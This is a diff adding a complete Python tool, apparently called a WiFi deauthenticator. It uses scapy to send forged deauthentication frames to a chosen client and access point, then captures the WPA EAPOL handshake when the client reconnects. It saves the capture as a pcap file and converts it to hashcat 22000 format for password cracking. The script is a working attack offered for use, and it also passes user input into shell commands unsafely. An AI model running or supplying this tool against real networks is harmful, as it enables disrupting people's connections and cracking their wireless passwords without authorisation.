@@ -1,0 +1,87 @@
+import argparse
+import os
+import shutil
+import subprocess
+import threading
+import time
+from datetime import datetime
+from scapy.layers.dot11 import Dot11Deauth, RadioTap, Dot11
+from scapy.layers.eap import EAPOL
+from scapy.sendrecv import sendp, sniff
+from scapy.utils import PcapWriter
+
+
+class bcolors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    ENDC = '\033[0m'
+    BOLD = '\033[1m'
+    UNDERLINE = '\033[4m'
+
+
+packet_list = []
+
+
+def check_args():
+    parser = argparse.ArgumentParser(description='Custom WiFi Deauthenticator')
+    parser.add_argument('-i', '--interface', help='Define Network Interface in Monitor Mode, Default: wlan0',
+                        default='wlan0', dest='iface')
+    parser.add_argument('-a', '--ap', help='AP MAC Address (UPPER), Default: None', required=True, dest='ap')
+    parser.add_argument('-c', '--client', help='Client MAC Address (UPPER), Default: None', required=True,
+                        dest='client')
+    parser.add_argument('-C', '--channel', help='AP Channel, Default: None', type=int, required=True, dest='channel')
+    parser.add_argument('-d', '--deauth', help='Number of Deauth packets to send, Default: 1', type=int, default='1',
+                        dest='deauth_count')
+    parser.add_argument('-p', '--pcap',
+                        help='PCAP file to save EAPOL Packets Automatically Appended Current Time, Default: sniffed_date.pcap',
+                        default='sniffed.pcap', dest='pcap_file')
+    results = parser.parse_args()
+    return results.iface, results.ap, results.client, results.channel, results.deauth_count, results.pcap_file
+
+
+def sniffer():
+    print(f"{bcolors.HEADER}[*] Running...{bcolors.ENDC}")
+    sniff(iface=iface, prn=packethandler, timeout=10)
+
+
+def packethandler(pkt):
+    pktdump = PcapWriter(pcap_file, append=True, sync=True)
+    if pkt.haslayer(Dot11):
+        if pkt.haslayer(EAPOL) or (pkt.type == 0 and pkt.addr3 == ap.lower()):
+            pktdump.write(pkt)
+            if pkt.haslayer(EAPOL):
+                print(f"{bcolors.OKGREEN}Captured EAPOL Packet from SRC: %s and DST: %s{bcolors.ENDC}" % (pkt.addr2, pkt.addr1))
+                packet_list.append(pkt)
+
+def cap_converter():
+    print('\n''Converting to hashcat 22000 format..''\n')
+    hccapx_path = os.path.splitext(pcap_file)[0] + '.22000'
+    if shutil.which("cap2hccapx.bin") is not None:
+        subprocess.call('/usr/local/bin/cap2hccapx.bin %s %s' % (pcap_file, hccapx_path), shell=True)
+        print('\n')
+    else:
+        print(f"{bcolors.FAIL}can't find cap2hccapx.bin in PATH{bcolors.ENDC}\n")
+
+
+def send_deauth_packet():
+    pkt1 = RadioTap() / Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth()
+    sendp(pkt1, count=deauth_count, iface=iface, verbose=False)
+
+
+if __name__ == '__main__':
+    iface, ap, client, channel, deauth_count, pcap_file = check_args()
+    pcap_file = os.path.splitext(pcap_file)[0] + '_' + datetime.now().strftime("%Y_%m_%d-%H-%M-%S") + '.pcap'
+    os.system('iwconfig %s channel %s' % (iface, channel))
+    t = threading.Thread(target=sniffer)
+    t.start()
+    time.sleep(2)
+    send_deauth_packet()
+    print(f"{bcolors.OKBLUE}Sent %s Deauth Packet(s){bcolors.ENDC}" % deauth_count)
+    t.join()
+    print(f"{bcolors.WARNING}Captured Total %s EAPOL Packets{bcolors.ENDC}" %(len(packet_list)), '\n')
+    print('Packets Written to: %s' %(os.getcwd()+'/'+pcap_file))
+    cap_converter() # Function that converts pcap to hashcat 22000 mode.
+
